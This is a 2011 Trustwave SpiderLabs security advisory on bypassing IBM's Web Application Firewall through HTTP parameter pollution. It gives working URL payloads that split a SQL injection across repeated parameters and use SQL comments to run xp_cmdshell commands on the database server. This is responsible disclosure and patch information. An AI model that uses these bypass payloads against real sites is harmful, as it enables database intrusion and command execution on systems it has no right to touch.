@@ -1,0 +1,144 @@
+Trustwave's SpiderLabs Security Advisory TWSL2011-006:
+IBM Web Application Firewall Bypass
+
+https://www.trustwave.com/spiderlabs/advisories/TWSL2011-006.txt
+
+Published: 2011-06-21
+Version: 1.0
+
+Vendor: IBM
+Product: IBM Web Application Firewall 
+These capabilities are included through SiteProtector 7.0 and later
+software within IBM Security Network IPS GX products, IBM Security Server
+Protection products, and IBM Security Multi-Function product lines during
+2H of 2009.
+
+Versions affected:  
+Tested against G400 IPS-G400-IB-1 (Intrusion Prevention
+Update: 2011-03-11 00:34:23 - version: 31.030) and GX4004 IPS-GX4004-IB-2
+(Intrusion Prevention Update: 2011-03-10 23:49:15 - version: 31.030).
+
+Product description:
+IBM Web Application Firewall capabilities inside IBM IPS products
+complement IBM Security's portfolio of web application security offerings
+to deliver end-to-end Web application security solutions.
+
+Credit: Wendel Guglielmetti Henrique of Trustwave's SpiderLabs
+
+Finding: IBM Web Application Firewall Bypass
+
+The IBM Web Application Firewall can be evaded, allowing an attacker to
+exploit web vulnerabilities that the product intends to protect. The issue
+occurs when an attacker submits repeated occurrences of the same parameter.
+
+The example shown below uses the following environment:
+A web environment using Microsoft IIS, ASP .NET technology, Microsoft 
+SQL Server 2000, being protected by the IBM Web Application Firewall.
+
+As expected, the following request will be identified and blocked (depending 
+of configuration) by the IBM Web application firewall.
+
+http://sitename/find_ta_def.aspx?id=2571&iid='; EXEC 
+master..xp_cmdshell "ping 10.1.1.3" --
+
+IIS with ASP.NET (and even pure ASP) technology will concatenate the contents 
+of a parameter if multiple entries are part of the request.
+
+http://sitename/find_ta_def.aspx?id=2571&iid='; EXEC 
+master..xp_cmdshell &iid= "ping 10.1.1.3" --
+
+IIS with ASP.NET (and even pure ASP) technology will concatenate both
+entries of iid parameter, however it will include an comma "," between
+them, resulting in the following output being sent to the database.
+
+'; EXEC master..xp_cmdshell , "ping 10.1.1.3" --
+
+The request above will be identified and blocked (depending of
+configuration) by IBM Web application firewall, because it appears that
+"EXEC" and "xp_cmdshell" trigger an attack pattern.
+
+However, it is possible to split all the spaces in multiple parameters. For
+example:
+
+http://sitename/find_ta_def.aspx?id=2571&iid='; &iid= EXEC 
+&iid= master..xp_cmdshell &iid= "ping 10.1.1.3" &iid= --
+
+The above request will bypass the affected IBM Web application firewall,
+resulting in the following output being sent to the database.
+
+'; , EXEC , master..xp_cmdshell , "ping 10.1.1.3" , --
+
+However, the above SQL code will not be properly executed because of the
+comma inserted on the SQL query, to solve this situation we will use SQL
+comments.
+
+http://sitename/find_ta_def.aspx?id=2571&iid='; /*&iid=1*/ EXEC 
+/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 10.1.1.3" /*&iid=1*/ --
+
+The above request will bypass IBM Web application firewall, resulting in
+the following output being sent to the database, which is a valid and
+working SQL code.
+
+'; /*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 10.1.1.3" /*,1*/ --
+
+The above code will execute the ping command on the Microsoft Windows
+backend, assuming the application was running with administrative
+privileges.
+
+This attack class is also referenced sometimes as HTTP Pollution Attack,
+HTTP Parameter Pollution (HPP) and HTTP Parameter Concatenation.
+
+The exploitability of this issue depends of the infrastructure (WebServer,
+Development Framework Technology, etc) technology being used.
+
+
+Remediation Steps:
+IBM has released fixes to the above issue in the "Super Tuesday" patch
+released in June. Refer to the references section of the advisory for
+further information released by IBM.
+
+Revision History:
+04/07/11 - Vulnerability disclosed
+06/16/11 - Patch released
+06/21/11 - Advisory published
+
+References:
+1. http://www.iss.net/security_center/reference/vuln/HTTP_Parameter_Abuse.htm
+2. http://xforce.iss.net/xforce/xfdb/67178
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave's SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
